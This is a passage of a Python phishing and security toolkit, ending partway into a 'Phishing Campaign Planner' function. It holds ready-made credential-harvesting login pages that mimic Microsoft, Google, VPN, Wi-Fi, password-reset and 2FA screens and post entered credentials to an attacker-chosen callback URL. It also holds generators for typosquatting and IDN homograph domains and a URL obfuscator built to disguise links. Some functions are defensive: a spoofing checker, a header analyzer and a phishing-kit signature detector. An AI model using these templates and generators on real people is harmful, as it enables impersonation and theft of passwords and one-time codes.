            print(f"    {R}■{RST} {Y}{title}:{RST} {W}{detail}{RST}")

    print(f"\n  {Y}── Risk Score ──{RST}")
    score = min(score, 100)
    if score >= 70:
        print(f"  {R}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — HIGH RISK (likely phishing){RST}")
    elif score >= 40:
        print(f"  {Y}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — MEDIUM RISK (suspicious){RST}")
    else:
        print(f"  {G}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — LOW RISK{RST}")


# ─── 83. Email Spoofing Checker ──────────────────────────────────────────────

def email_spoof_check():
    print_header("Email Spoofing Checker")
    if not phishing_disclaimer():
        return

    domain = prompt("Target domain")
    if not domain:
        return

    if dns is None:
        print_err("dnspython required: pip install dnspython")
        return

    spinner("Checking spoofing protections...", 1.0)

    spoofable = True
    score = 0  # 0 = fully spoofable, higher = more protected

    # SPF
    print(f"\n  {Y}── SPF ──{RST}")
    try:
        answers = dns.resolver.resolve(domain, "TXT")
        spf = None
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if "v=spf1" in txt:
                spf = txt
                break
        if spf:
            print_row("Record", spf[:70])
            if "-all" in spf:
                print(f"    {G}✓{RST} Hard fail (-all)")
                score += 30
            elif "~all" in spf:
                print(f"    {Y}~{RST} Soft fail (~all) – emails may still be delivered")
                score += 15
            elif "?all" in spf or "+all" in spf:
                print(f"    {R}✗{RST} Weak/open policy – easy to spoof")
        else:
            print(f"    {R}✗{RST} No SPF record – easy to spoof")
    except Exception:
        print(f"    {R}✗{RST} No SPF record found")

    # DMARC
    print(f"\n  {Y}── DMARC ──{RST}")
    try:
        answers = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
        dmarc = None
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if "v=DMARC1" in txt:
                dmarc = txt
                break
        if dmarc:
            print_row("Record", dmarc[:70])
            if "p=reject" in dmarc:
                print(f"    {G}✓{RST} Policy: REJECT")
                score += 40
                spoofable = False
            elif "p=quarantine" in dmarc:
                print(f"    {Y}~{RST} Policy: QUARANTINE")
                score += 25
            elif "p=none" in dmarc:
                print(f"    {R}✗{RST} Policy: NONE (monitoring only)")
                score += 5
            if "pct=" in dmarc:
                pct = re.search(r"pct=(\d+)", dmarc)
                if pct and int(pct.group(1)) < 100:
                    print(f"    {Y}⚠{RST} Only {pct.group(1)}% of emails checked")
        else:
            print(f"    {R}✗{RST} No DMARC record – easy to spoof")
    except Exception:
        print(f"    {R}✗{RST} No DMARC record found")

    # DKIM
    print(f"\n  {Y}── DKIM ──{RST}")
    selectors = ["default", "google", "selector1", "selector2", "dkim", "mail", "s1", "k1"]
    dkim_found = False
    for sel in selectors:
        try:
            dns.resolver.resolve(f"{sel}._domainkey.{domain}", "TXT")
            print(f"    {G}✓{RST} DKIM record found (selector: {sel})")
            dkim_found = True
            score += 15
            break
        except Exception:
            continue
    if not dkim_found:
        print(f"    {Y}~{RST} No DKIM records (common selectors)")

    # MTA-STS
    print(f"\n  {Y}── MTA-STS ──{RST}")
    try:
        answers = dns.resolver.resolve(f"_mta-sts.{domain}", "TXT")
        for rdata in answers:
            txt = rdata.to_text().strip('"')
            if "v=STSv1" in txt:
                print(f"    {G}✓{RST} MTA-STS enabled: {txt}")
                score += 10
                break
        else:
            print(f"    {Y}~{RST} No MTA-STS")
    except Exception:
        print(f"    {Y}~{RST} No MTA-STS record")

    # Verdict
    print(f"\n  {Y}── Spoofing Verdict ──{RST}")
    print_row("Protection Score", f"{score}/100")
    if score >= 70:
        print(f"  {G}WELL PROTECTED – Spoofing is difficult{RST}")
    elif score >= 40:
        print(f"  {Y}PARTIAL PROTECTION – Spoofing may be possible{RST}")
    else:
        print(f"  {R}VULNERABLE – Domain can likely be spoofed for phishing{RST}")
        print(f"  {R}Emails from {domain} can be forged without detection{RST}")


# ─── 84. Typosquatting Generator ─────────────────────────────────────────────

def typosquat_generator():
    print_header("Typosquatting Domain Generator")
    if not phishing_disclaimer():
        return

    domain = prompt("Target domain (e.g. example.com)")
    if not domain:
        return

    name, _, tld = domain.partition(".")
    if not tld:
        print_err("Enter domain with TLD")
        return

    results = []

    # Bit-flip domains (single bit flips in ASCII)
    for i, char in enumerate(name):
        for bit in range(8):
            flipped = chr(ord(char) ^ (1 << bit))
            if flipped.isalnum() and flipped != char:
                fake = name[:i] + flipped + name[i+1:]
                results.append((f"{fake}.{tld}", f"bit-flip '{char}'→'{flipped}' (pos {i})"))

    # Vowel swap
    vowels = "aeiou"
    for i, char in enumerate(name):
        if char.lower() in vowels:
            for v in vowels:
                if v != char.lower():
                    fake = name[:i] + v + name[i+1:]
                    results.append((f"{fake}.{tld}", f"vowel swap '{char}'→'{v}' (pos {i})"))

    # Insertion of repeated chars
    for i in range(len(name)):
        fake = name[:i] + name[i] + name[i:]
        results.append((f"{fake}.{tld}", f"repeat '{name[i]}' (pos {i})"))

    # Dot insertion (sub.domain confusion)
    for i in range(1, len(name)):
        fake = name[:i] + "." + name[i:]
        results.append((f"{fake}.{tld}", f"dot insert (pos {i})"))

    # Singular/plural
    if name.endswith("s"):
        results.append((f"{name[:-1]}.{tld}", "remove trailing 's'"))
    else:
        results.append((f"{name}s.{tld}", "add trailing 's'"))

    # Prefix/suffix abuse
    for affix in ["my", "the", "get", "go", "e", "i", "web", "app", "secure", "login"]:
        results.append((f"{affix}{name}.{tld}", f"prefix '{affix}'"))
        results.append((f"{name}{affix}.{tld}", f"suffix '{affix}'"))

    # Hyphen variations
    for i in range(1, len(name)):
        fake = name[:i] + "-" + name[i:]
        results.append((f"{fake}.{tld}", f"hyphen insert (pos {i})"))

    # Deduplicate
    seen = set()
    unique = []
    for dom, desc in results:
        d_low = dom.lower()
        if d_low not in seen and d_low != domain.lower():
            seen.add(d_low)
            unique.append((dom, desc))

    print(f"\n  {Y}Generated {len(unique)} typosquatting domains:{RST}\n")
    for dom, desc in unique[:60]:
        print(f"    {R}•{RST} {W}{dom:<35}{RST} {C}{desc}{RST}")
    if len(unique) > 60:
        print(f"\n    {Y}... and {len(unique) - 60} more{RST}")

    check = input(f"\n  {Y}Check which are registered? (y/n):{RST} ").strip().lower()
    if check in ("y", "yes", "s", "si"):
        spinner("Resolving...", 1.0)
        registered = []

        def check_dom(d):
            try:
                if STEALTH["enabled"] and dns is not None:
                    dns.resolver.resolve(d, "A", lifetime=10)
                else:
                    socket.gethostbyname(d)
                return d
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(check_dom, d): d for d, _ in unique[:60]}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    registered.append(result)
                    print(f"    {R}[REGISTERED]{RST} {W}{result}{RST}")

        if registered:
            print(f"\n  {R}WARNING: {len(registered)} typosquat domain(s) registered!{RST}")
        else:
            print(f"\n  {G}No typosquat domains appear registered{RST}")


# ─── 85. Credential Harvest Page Gen ─────────────────────────────────────────

def credential_harvest_gen():
    print_header("Credential Harvester Template Generator")
    if not phishing_disclaimer():
        return

    print(f"""
  {Y}Available templates:{RST}
    {C}1.{RST} Generic Login Page
    {C}2.{RST} Office 365 / Microsoft
    {C}3.{RST} Google Workspace
    {C}4.{RST} Corporate VPN Portal
    {C}5.{RST} WiFi Captive Portal
    {C}6.{RST} Password Reset Page
    {C}7.{RST} Two-Factor Auth Page
    {C}8.{RST} File Share Download
    """)

    choice = input(f"  {Y}Select template (1-8):{RST} ").strip()
    callback_url = prompt("Callback URL (where creds are sent)")
    if not callback_url:
        callback_url = "https://YOUR-SERVER/collect"

    company = input(f"  {Y}Company name [ACME Corp]:{RST} ").strip() or "ACME Corp"

    templates = {
        "1": ("Generic Login", f"""<!DOCTYPE html>
<html><head><title>{company} - Sign In</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);width:400px}}
h2{{text-align:center;margin-bottom:24px;color:#1a1a2e}}
input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
button{{width:100%;padding:12px;background:#4a90d9;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:12px}}
button:hover{{background:#357abd}}
.footer{{text-align:center;margin-top:16px;color:#888;font-size:12px}}
</style></head>
<body><div class="card">
<h2>{company}</h2><p style="text-align:center;color:#666;margin-bottom:20px">Sign in to your account</p>
<form method="POST" action="{callback_url}">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="footer">Protected by {company} Security</div>
</div></body></html>"""),

        "2": ("Office 365", f"""<!DOCTYPE html>
<html><head><title>Sign in to your account</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}}
.container{{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}}
.logo{{font-size:24px;font-weight:600;margin-bottom:16px}}
.logo span{{color:#0078d4}}
input{{width:100%;padding:10px 8px;margin:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;outline:none}}
input:focus{{border-bottom:2px solid #0078d4}}
button{{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer;margin-top:16px}}
a{{color:#0067b8;text-decoration:none;font-size:13px}}
</style></head>
<body><div class="container">
<div class="logo"><span>Microsoft</span></div>
<p style="font-size:15px;margin-bottom:20px">Sign in</p>
<form method="POST" action="{callback_url}">
<input type="email" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<p style="margin:8px 0"><a href="#">Can't access your account?</a></p>
<button type="submit">Sign in</button>
</form>
</div></body></html>"""),

        "3": ("Google Workspace", f"""<!DOCTYPE html>
<html><head><title>Sign in - Google Accounts</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Google Sans','Roboto',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:450px}}
.logo{{text-align:center;margin-bottom:16px;font-size:24px}} .logo b{{color:#4285f4}}
h1{{font-size:24px;text-align:center;font-weight:400;margin-bottom:8px}}
p{{text-align:center;color:#202124;margin-bottom:24px;font-size:16px}}
input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin:8px 0;outline:none}}
input:focus{{border:2px solid #1a73e8}}
button{{float:right;padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;margin-top:20px}}
a{{color:#1a73e8;text-decoration:none;font-size:14px}}
</style></head>
<body><div class="card">
<div class="logo"><b>G</b>oogle</div>
<h1>Sign in</h1>
<p>to continue to {company}</p>
<form method="POST" action="{callback_url}">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Enter your password" required>
<a href="#">Forgot password?</a>
<button type="submit">Next</button>
</form>
</div></body></html>"""),

        "4": ("VPN Portal", f"""<!DOCTYPE html>
<html><head><title>{company} - VPN Access</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{background:#fff;padding:40px;border-radius:8px;width:380px;box-shadow:0 10px 40px rgba(0,0,0,.3)}}
.shield{{text-align:center;font-size:48px;margin-bottom:12px}}
h2{{text-align:center;color:#1a1a2e;margin-bottom:4px}}
.sub{{text-align:center;color:#888;margin-bottom:24px;font-size:13px}}
input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
button{{width:100%;padding:12px;background:#e74c3c;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:12px}}
</style></head>
<body><div class="card">
<div class="shield">🛡</div>
<h2>{company} VPN</h2>
<p class="sub">Secure Remote Access Portal</p>
<form method="POST" action="{callback_url}">
<input type="text" name="username" placeholder="Username / Employee ID" required>
<input type="password" name="password" placeholder="Password" required>
<input type="text" name="otp" placeholder="OTP Token (optional)">
<button type="submit">Connect</button>
</form>
</div></body></html>"""),

        "5": ("WiFi Captive Portal", f"""<!DOCTYPE html>
<html><head><title>{company} WiFi - Accept Terms</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:#1a73e8;display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{background:#fff;padding:40px;border-radius:12px;width:420px;text-align:center}}
h2{{margin-bottom:8px}}
.sub{{color:#666;margin-bottom:24px;font-size:14px}}
input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:14px}}
button{{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px}}
.terms{{font-size:11px;color:#999;margin-top:12px}}
</style></head>
<body><div class="card">
<h2>📶 {company} WiFi</h2>
<p class="sub">Sign in with your credentials to access the network</p>
<form method="POST" action="{callback_url}">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect to WiFi</button>
</form>
<p class="terms">By connecting you agree to the Terms of Service</p>
</div></body></html>"""),

        "6": ("Password Reset", f"""<!DOCTYPE html>
<html><head><title>{company} - Password Reset Required</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:#fff3cd;display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{background:#fff;padding:40px;border-radius:8px;width:420px;box-shadow:0 4px 20px rgba(0,0,0,.1)}}
.warn{{background:#fff3cd;padding:12px;border-radius:6px;margin-bottom:20px;border-left:4px solid #ffc107;font-size:13px;color:#856404}}
h2{{margin-bottom:16px;color:#dc3545}}
input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
button{{width:100%;padding:12px;background:#dc3545;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:12px}}
</style></head>
<body><div class="card">
<h2>Password Reset Required</h2>
<div class="warn">Your password has expired. Please verify your identity and set a new password.</div>
<form method="POST" action="{callback_url}">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="current_password" placeholder="Current password" required>
<input type="password" name="new_password" placeholder="New password" required>
<input type="password" name="confirm_password" placeholder="Confirm new password" required>
<button type="submit">Reset Password</button>
</form>
</div></body></html>"""),

        "7": ("2FA Page", f"""<!DOCTYPE html>
<html><head><title>{company} - Verification Required</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{background:#fff;padding:40px;border-radius:12px;width:380px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1)}}
.icon{{font-size:48px;margin-bottom:12px}}
h2{{margin-bottom:8px}}
.sub{{color:#666;margin-bottom:24px;font-size:14px}}
input{{width:100%;padding:16px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:24px;text-align:center;letter-spacing:8px}}
button{{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px}}
a{{color:#0067b8;text-decoration:none;font-size:13px}}
</style></head>
<body><div class="card">
<div class="icon">🔐</div>
<h2>Verification Code</h2>
<p class="sub">Enter the 6-digit code from your authenticator app</p>
<form method="POST" action="{callback_url}">
<input type="text" name="otp_code" maxlength="6" pattern="[0-9]{{6}}" placeholder="000000" required>
<button type="submit">Verify</button>
</form>
<p style="margin-top:16px"><a href="#">Use backup code instead</a></p>
</div></body></html>"""),

        "8": ("File Share", f"""<!DOCTYPE html>
<html><head><title>Shared Document - Sign in to view</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}}
.card{{background:#fff;padding:40px;border-radius:8px;width:420px;box-shadow:0 4px 20px rgba(0,0,0,.1)}}
.file{{background:#f8f9fa;padding:16px;border-radius:8px;margin-bottom:20px;display:flex;align-items:center;gap:12px;border:1px solid #e9ecef}}
.file-icon{{font-size:32px}}
.file-info h3{{font-size:14px;margin-bottom:4px}}
.file-info span{{font-size:12px;color:#666}}
h2{{margin-bottom:16px;font-size:18px}}
input{{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:6px;font-size:14px}}
button{{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;margin-top:12px}}
</style></head>
<body><div class="card">
<div class="file"><span class="file-icon">📄</span><div class="file-info"><h3>Q4_Financial_Report_2024.xlsx</h3><span>Shared by CEO — {company}</span></div></div>
<h2>Sign in to access this document</h2>
<form method="POST" action="{callback_url}">
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">View Document</button>
</form>
</div></body></html>"""),
    }

    if choice not in templates:
        print_err("Invalid template")
        return

    tpl_name, html = templates[choice]
    print(f"\n  {G}Generated: {tpl_name}{RST}")
    print(f"  {Y}Callback URL: {W}{callback_url}{RST}")

    save = input(f"\n  {Y}Save to file? (filename or Enter to print):{RST} ").strip()
    if save:
        try:
            with open(save, "w") as f:
                f.write(html)
            print_ok(f"Saved to {save}")
        except Exception as e:
            print_err(f"Could not save: {e}")
    else:
        print(f"\n{html}")


# ─── 86. URL Obfuscator ─────────────────────────────────────────────────────

def url_obfuscator():
    print_header("URL Obfuscator")
    if not phishing_disclaimer():
        return

    url = prompt("URL to obfuscate")
    if not url:
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    import urllib.parse as _up

    parsed = urlparse(url)
    host = parsed.hostname
    path = parsed.path or "/"
    scheme = parsed.scheme

    # Resolve IP
    try:
        if STEALTH["enabled"] and dns is not None:
            answers = dns.resolver.resolve(host, "A", lifetime=10)
            ip = str(answers[0])
        else:
            ip = socket.gethostbyname(host)
        octets = list(map(int, ip.split(".")))
    except Exception:
        ip = None
        octets = None

    results = []

    # URL encoding
    encoded = _up.quote(url, safe=":/")
    results.append(("URL Encoded", encoded))

    # Double URL encoding
    double = _up.quote(_up.quote(url, safe=""), safe="")
    results.append(("Double URL Encoded", double))

    if octets:
        # Decimal IP
        decimal_ip = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
        results.append(("Decimal IP", f"{scheme}://{decimal_ip}{path}"))

        # Hex IP
        hex_ip = f"0x{octets[0]:02x}{octets[1]:02x}{octets[2]:02x}{octets[3]:02x}"
        results.append(("Hex IP", f"{scheme}://{hex_ip}{path}"))

        # Octal IP
        octal_ip = f"0{octets[0]:o}.0{octets[1]:o}.0{octets[2]:o}.0{octets[3]:o}"
        results.append(("Octal IP", f"{scheme}://{octal_ip}{path}"))

        # Overflow IP (add 256)
        overflow = f"{octets[0]+256}.{octets[1]+256}.{octets[2]+256}.{octets[3]+256}"
        results.append(("Overflow IP", f"{scheme}://{overflow}{path}"))

    # @ trick
    results.append(("@ Redirect", f"{scheme}://legitimate-site.com@{host}{path}"))

    # Subdomain confusion
    results.append(("Subdomain Spoof", f"{scheme}://login.microsoft.com.{host}{path}"))

    # Right-to-left override
    results.append(("Unicode RTL", f"{scheme}://\u202e{host[::-1]}{path}"))

    # URL with credentials
    results.append(("URL Credentials", f"{scheme}://user:password@{host}{path}"))

    # Fragment trick
    results.append(("Fragment Trick", f"{scheme}://legitimate.com#{url}"))

    # Short hex host
    if octets:
        results.append(("Short IP", f"{scheme}://{octets[0]}.{octets[1]}.{(octets[2] << 8) + octets[3]}{path}"))

    print(f"\n  {Y}Obfuscated URLs:{RST}\n")
    for label, obf_url in results:
        print(f"  {C}{label:<22}{RST} {W}{obf_url}{RST}")


# ─── 87. Phishing Email Header Analyzer ──────────────────────────────────────

def email_header_analyzer():
    print_header("Phishing Email Header Analyzer")
    print(f"  {Y}Paste email headers (end with empty line):{RST}")

    lines = []
    while True:
        line = input()
        if line.strip() == "":
            break
        lines.append(line)

    if not lines:
        print_err("No headers provided")
        return

    raw = "\n".join(lines)
    spinner("Analyzing headers...", 1.0)

    findings = []
    score = 0

    # Parse headers into dict
    headers = {}
    current_key = None
    for line in lines:
        if ":" in line and not line.startswith((" ", "\t")):
            key, _, val = line.partition(":")
            current_key = key.strip()
            headers[current_key.lower()] = val.strip()
        elif current_key and line.startswith((" ", "\t")):
            headers[current_key.lower()] += " " + line.strip()

    # From analysis
    from_header = headers.get("from", "")
    return_path = headers.get("return-path", "")
    if from_header:
        print_row("From", from_header)
    if return_path:
        print_row("Return-Path", return_path)
        if from_header and return_path:
            from_domain = re.search(r'@([\w.-]+)', from_header)
            rp_domain = re.search(r'@([\w.-]+)', return_path)
            if from_domain and rp_domain and from_domain.group(1).lower() != rp_domain.group(1).lower():
                score += 25
                findings.append(("Domain mismatch", f"From: {from_domain.group(1)} vs Return-Path: {rp_domain.group(1)}"))

    # SPF result
    auth_results = headers.get("authentication-results", "")
    received_spf = headers.get("received-spf", "")
    spf_text = auth_results + " " + received_spf
    if "spf=fail" in spf_text.lower() or "spf=softfail" in spf_text.lower():
        score += 20
        findings.append(("SPF Failed", "Sender IP not authorized"))
    elif "spf=pass" in spf_text.lower():
        print_ok("SPF: PASS")

    # DKIM result
    if "dkim=fail" in auth_results.lower():
        score += 20
        findings.append(("DKIM Failed", "Email signature invalid"))
    elif "dkim=pass" in auth_results.lower():
        print_ok("DKIM: PASS")

    # DMARC result
    if "dmarc=fail" in auth_results.lower():
        score += 20
        findings.append(("DMARC Failed", "Domain policy not met"))
    elif "dmarc=pass" in auth_results.lower():
        print_ok("DMARC: PASS")

    # Reply-To mismatch
    reply_to = headers.get("reply-to", "")
    if reply_to and from_header:
        from_dom = re.search(r'@([\w.-]+)', from_header)
        reply_dom = re.search(r'@([\w.-]+)', reply_to)
        if from_dom and reply_dom and from_dom.group(1).lower() != reply_dom.group(1).lower():
            score += 15
            findings.append(("Reply-To mismatch", f"From: {from_dom.group(1)} vs Reply-To: {reply_dom.group(1)}"))

    # X-Mailer
    x_mailer = headers.get("x-mailer", "")
    if x_mailer:
        print_row("X-Mailer", x_mailer)
        sus_mailers = ["phpmailer", "swiftmailer", "king-phisher", "gophish", "set"]
        for m in sus_mailers:
            if m in x_mailer.lower():
                score += 15
                findings.append(("Suspicious mailer", x_mailer))

    # Received hops
    received = [v for k, v in zip(lines, lines) if k.lower().startswith("received:")]
    if received:
        print_row("Received Hops", str(len(received)))

    # Subject urgency
    subject = headers.get("subject", "")
    if subject:
        print_row("Subject", subject)
        urgent_words = ["urgent", "immediate", "action required", "verify", "suspended",
                        "locked", "unusual", "security alert", "confirm", "expire"]
        found_urgent = [w for w in urgent_words if w in subject.lower()]
        if found_urgent:
            score += 10
            findings.append(("Urgency tactics", ", ".join(found_urgent)))

    # Display findings
    if findings:
        print(f"\n  {Y}── Suspicious Indicators ──{RST}")
        for title, detail in findings:
            print(f"    {R}■{RST} {Y}{title}:{RST} {W}{detail}{RST}")

    print(f"\n  {Y}── Phishing Score ──{RST}")
    score = min(score, 100)
    if score >= 60:
        print(f"  {R}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — LIKELY PHISHING{RST}")
    elif score >= 30:
        print(f"  {Y}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — SUSPICIOUS{RST}")
    else:
        print(f"  {G}{'█' * (score // 5)}{'░' * (20 - score // 5)} {score}/100 — APPEARS LEGITIMATE{RST}")


# ─── 88. IDN Homograph Attack Gen ────────────────────────────────────────────

IDN_MAP = {
    'a': 'а', 'c': 'с', 'd': 'ԁ', 'e': 'е', 'g': 'ɡ', 'h': 'һ',
    'i': 'і', 'j': 'ј', 'k': 'к', 'l': 'ӏ', 'o': 'о', 'p': 'р',
    'q': 'ԛ', 's': 'ѕ', 'w': 'ԝ', 'x': 'х', 'y': 'у',
}


def idn_homograph():
    print_header("IDN Homograph Attack Generator")
    if not phishing_disclaimer():
        return

    domain = prompt("Target domain (e.g. apple.com)")
    if not domain:
        return

    name, _, tld = domain.partition(".")
    if not tld:
        print_err("Enter domain with TLD")
        return

    results = []

    # Full homograph (replace all possible chars)
    full = "".join(IDN_MAP.get(c, c) for c in name.lower())
    if full != name.lower():
        puny = "xn--" + full.encode("punycode").decode()
        results.append((f"{full}.{tld}", f"{puny}.{tld}", "Full homograph"))

    # Single char replacements
    for i, char in enumerate(name.lower()):
        if char in IDN_MAP:
            fake = name[:i] + IDN_MAP[char] + name[i+1:]
            puny = "xn--" + fake.encode("punycode").decode()
            results.append((f"{fake}.{tld}", f"{puny}.{tld}", f"'{char}' → Cyrillic (pos {i})"))

    # Multi char combos
    replaceable = [(i, c) for i, c in enumerate(name.lower()) if c in IDN_MAP]
    if len(replaceable) >= 2:
        for a in range(len(replaceable)):
            for b in range(a + 1, min(a + 3, len(replaceable))):
                idx_a, char_a = replaceable[a]
                idx_b, char_b = replaceable[b]
                fake = list(name.lower())
                fake[idx_a] = IDN_MAP[char_a]
                fake[idx_b] = IDN_MAP[char_b]
                fake_str = "".join(fake)
                puny = "xn--" + fake_str.encode("punycode").decode()
                results.append((f"{fake_str}.{tld}", f"{puny}.{tld}",
                               f"'{char_a}'+'{char_b}' → Cyrillic (pos {idx_a},{idx_b})"))

    if not results:
        print_warn("No homograph substitutions possible for this domain")
        return

    # Deduplicate
    seen = set()
    unique = []
    for visual, puny, desc in results:
        if puny not in seen:
            seen.add(puny)
            unique.append((visual, puny, desc))

    print(f"\n  {Y}Generated {len(unique)} IDN homograph domains:{RST}\n")
    print(f"  {C}{'Visual':<30} {'Punycode':<40} {'Type'}{RST}")
    print(f"  {'─' * 90}")
    for visual, puny, desc in unique[:40]:
        print(f"  {W}{visual:<30}{RST} {Y}{puny:<40}{RST} {C}{desc}{RST}")

    if len(unique) > 40:
        print(f"\n  {Y}... and {len(unique) - 40} more{RST}")

    print(f"\n  {Y}NOTE:{RST} Modern browsers show punycode for mixed-script domains.")
    print(f"  {Y}Full-script homographs (all chars replaced) are most effective.{RST}")


# ─── 89. Phishing Kit Detector ───────────────────────────────────────────────

PHISHING_KIT_SIGS = {
    "GoPhish": ["rid=", "goPhish", "/track?", "X-Gophish-Contact"],
    "King Phisher": ["king-phisher", "kp_campaign", "kp_"],
    "Evilginx2": ["__evilginx", "ident=", "/lures/"],
    "Modlishka": ["modlishka", "phishlet"],
    "SET (Social Engineering Toolkit)": ["/set/", "credential_harvester"],
    "HiddenEye": ["hiddeneye", "hidden_eye"],
    "SocialFish": ["socialfish", "social_fish"],
    "BlackEye": ["blackeye", "black_eye"],
    "ShellPhish": ["shellphish", "shell_phish"],
    "Zphisher": ["zphisher", ".zphisher"],
    "Generic Kit": ["action=\"harvest\"", "action=\"collect\"", "action=\"post.php\"",
                     "password\" name=\"pass", "email\" name=\"login"],
}


def phishing_kit_detector():
    print_header("Phishing Kit Detector")
    target = prompt("Suspicious URL to scan")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Scanning for phishing kit signatures...", 1.5)

    try:
        resp = requests.get(target, timeout=10, verify=False)
    except Exception as e:
        print_err(f"Error: {e}")
        return

    body = resp.text.lower()
    headers_str = str(resp.headers).lower()
    detected = []

    for kit, signatures in PHISHING_KIT_SIGS.items():
        matches = []
        for sig in signatures:
            if sig.lower() in body or sig.lower() in headers_str:
                matches.append(sig)
        if matches:
            detected.append((kit, matches))

    # Additional checks
    print(f"\n  {Y}── Page Analysis ──{RST}")
    print_row("Status Code", str(resp.status_code))
    print_row("Content-Length", str(len(resp.text)))
    server = resp.headers.get("Server", "N/A")
    print_row("Server", server)

    # Form analysis
    if BeautifulSoup:
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        print_row("Forms Found", str(len(forms)))
        for i, form in enumerate(forms, 1):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            pwd_fields = form.find_all("input", {"type": "password"})
            if pwd_fields:
                print(f"    {R}⚠{RST} Form #{i}: {method} to '{action}' — has password field!")
                if action and not action.startswith(("http://", "https://", "/")):
                    detected.append(("Suspicious Form", [f"action='{action}'"]))

    # Check for common phishing indicators
    phish_indicators = {
        "Password field + external action": "password" in body and "action=\"http" in body,
        "Login form with PHP handler": "action=\"" in body and ".php" in body and "password" in body,
        "Suspicious JavaScript redirect": "window.location" in body and "password" in body,
        "Base64 encoded content": "atob(" in body or "btoa(" in body,
        "Obfuscated JavaScript": "eval(unescape" in body or "eval(String.fromCharCode" in body,
        "Hidden iframe": 'style="display:none"' in body and "<iframe" in body,
    }

    print(f"\n  {Y}── Behavior Indicators ──{RST}")
    for desc, is_hit in phish_indicators.items():
        if is_hit:
            print(f"    {R}■{RST} {desc}")
            detected.append(("Indicator", [desc]))
        else:
            print(f"    {G}□{RST} {desc}")

    if detected:
        print(f"\n  {R}── Detected Phishing Signatures ──{RST}")
        for kit, sigs in detected:
            print(f"    {R}[DETECTED]{RST} {Y}{kit}{RST}: {W}{', '.join(sigs)}{RST}")
        print(f"\n  {R}WARNING: This page shows {len(detected)} phishing indicator(s)!{RST}")
    else:
        print(f"\n  {G}No known phishing kit signatures detected{RST}")
        print(f"  {Y}Note: custom or unknown kits may not be detected{RST}")


# ─── 90. Phishing Campaign Planner ───────────────────────────────────────────

def phishing_planner():
    print_header("Phishing Campaign Planner")
    if not phishing_disclaimer():
